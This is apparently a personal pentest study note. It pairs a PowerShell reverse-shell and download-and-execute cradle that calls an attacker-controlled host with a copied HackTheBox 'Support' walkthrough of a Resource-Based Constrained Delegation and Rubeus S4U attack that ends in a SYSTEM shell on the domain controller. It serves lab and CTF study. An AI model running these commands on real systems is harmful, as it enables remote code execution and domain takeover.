# Powershell

[nishang/Shells/Invoke-PowerShellTcp.ps1 at master · samratashok/nishang · GitHub](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

[RedTeam_CheatSheet.ps1 · GitHub](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.120 -Port 9001 -- colocar um comando no final do ficheiro
Depois criar um http server com este ficheiro
Na maquina comprometida utilizar este comando para fazer o download e executar o ficheiro
powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.120:8000/9002.ps1')"
```

From our previous enumeration we know that the support user is indeed a member of the
Authenticated Users group as well as the Shared Support Accounts group. We also know that the
Shared Support Accounts group has GenericAll privileges over the Domain Controller
( dc.support.htb ).
Let's check the value of the ms-ds-machineaccountquota attribute.
The output of the above command shows that this attribute is set to 10, which means each authenticated
domain user can add up to 10 computers to the domain.
Next, let's verify that the msds-allowedtoactonbehalfofotheridentity attribute is empty. To do so, we
need the PowerView module for PowerShell. We can upload it to the server via Evil-WinRM as shown
previously. We can then import it with the following command.
Once the module has been imported we can use the Get-DomainComputer commandlet to query the
required information.
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DSMachineAccountQuota

![Untitled](Powershell%20552be6a53a754215a7cca1cd96489593/Untitled.png)

. ./PowerView.ps1
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity

![2023-11-10 14_33_29-Support (1).pdf e mais 6 páginas - Pessoal - Microsoft​ Edge.png](Powershell%20552be6a53a754215a7cca1cd96489593/2023-11-10_14_33_29-Support_(1).pdf_e_mais_6_pginas_-_Pessoal_-_Microsoft_Edge.png)

The value is empty, which means we are ready to perform the RBCD attack, but first let's upload the tools
that are required. We will need PowerMad and Rubeus, which we can upload using Evil-WinRM as shown
previously. PowerMad can be imported with the following command.
Creating a Computer Object
Now, let's create a fake computer and add it to the domain. We can use PowerMad's New-MachineAccount
to achieve this.
The above command added a machine with the name FAKE-COMP01 to the domain with the password
Password123 . We can verify this new machine with the following command.
The output shows the details of FAKE-COMP01 and we can clearly see the SID value it was assigned.
Configuring RBCD
. ./Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString
'Password123' -AsPlainText -Force)

![2023-11-10 14_33_51-Support (1).pdf e mais 6 páginas - Pessoal - Microsoft​ Edge.png](Powershell%20552be6a53a754215a7cca1cd96489593/2023-11-10_14_33_51-Support_(1).pdf_e_mais_6_pginas_-_Pessoal_-_Microsoft_Edge.png)

Get-ADComputer -identity FAKE-COMP01

![2023-11-10 14_34_04-Support (1).pdf e mais 6 páginas - Pessoal - Microsoft​ Edge.png](Powershell%20552be6a53a754215a7cca1cd96489593/2023-11-10_14_34_04-Support_(1).pdf_e_mais_6_pginas_-_Pessoal_-_Microsoft_Edge.png)

Next, we will need to configure Resource-Based Constrained Delegation through one of two ways. We can
either set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin
PowerShell Active Directory module, which will in turn configure the msdsallowedtoactonbehalfofotheridentity attribute on its own, or we can use the PowerView module to
directly set the msds-allowedtoactonbehalfofotheridentity attribute.
For the purposes of this walkthrough we will use the former as it is a bit easier to understand. Let's use the
Set-ADComputer command to configure RBCD.
To verify that the command worked, we can use the Get-ADComputer command.
As we can see, the PrincipalsAllowedToDelegateToAccount is set to FAKE-COMP01 , which means the
command worked. We can also verify the value of the msds-allowedtoactonbehalfofotheridentity .

Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$

Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount

![Untitled](Powershell%20552be6a53a754215a7cca1cd96489593/Untitled%201.png)

Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity

![Untitled](Powershell%20552be6a53a754215a7cca1cd96489593/Untitled%202.png)

As we can see, the msds-allowedtoactonbehalfofotheridentity now has a value, but because the type
of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand
what's going on.
First, let's grab the desired value and dump it to a variable called RawBytes .
Then, let's convert these bytes to a Raw Security Descriptor object.
Finally, we can print both the entire security descriptor, as well as the DiscretionaryAcl class, which
represents the Access Control List that specifies the machines that can act on behalf of the DC.
$RawBytes = Get-DomainComputer DC -Properties 'msdsallowedtoactonbehalfofotheridentity' | select -expand msdsallowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList
$RawBytes, 0
$Descriptor
$Descriptor.DiscretionaryAcl

![Untitled](Powershell%20552be6a53a754215a7cca1cd96489593/Untitled%203.png)

From the output we can see that the SecurityIdentifier is set to the SID of FAKE-COMP01 that we saw
earlier, and the AceType is set to AccessAllowed .
Performing a S4U Attack
It is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the
Administrator. We will be using Rubeus to perform this attack.
First, we will need the hash of the password that was used to create the computer object.
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb

![Untitled](Powershell%20552be6a53a754215a7cca1cd96489593/Untitled%204.png)

We need to grab the value called rc4_hmac . Next, we can generate Kerberos tickets for the Administrator.
rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71
/impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt

![Untitled](Powershell%20552be6a53a754215a7cca1cd96489593/Untitled%205.png)

Rubeus successfuly generated the tickets. We can now grab the last Base64 encoded ticket and use it on our
local machine to get a shell on the DC as Administrator . To do so, copy the value of the last ticket and
paste it inside a file called ticket.kirbi.b64 .
Note: Before pasting the value to the file make sure to remove any whitespace characters from the value.
Next, create a new file called ticket.kirbi with the Base64 decoded value of the previous ticket.
Finally, we can convert this ticket to a format that Impacket can use. This can be achieved with Impackets'
[TicketConverter.py](http://ticketconverter.py/) .
base64 -d ticket.kirbi.b64 > ticket.kirbi
[ticketConverter.py](http://ticketconverter.py/) ticket.kirbi ticket.ccache

![Untitled](Powershell%20552be6a53a754215a7cca1cd96489593/Untitled%206.png)

To acquire a shell we can use Impackets' [psexec.py](http://psexec.py/) .
A shell as NT Authority\System is successfully received and the root flag can be found in
C:\Users\Administrator\Desktop .
KRB5CCNAME=ticket.ccache [psexec.py](http://psexec.py/) support.htb/administrator@dc.support.htb -k -no-pass

![Untitled](Powershell%20552be6a53a754215a7cca1cd96489593/Untitled%207.png)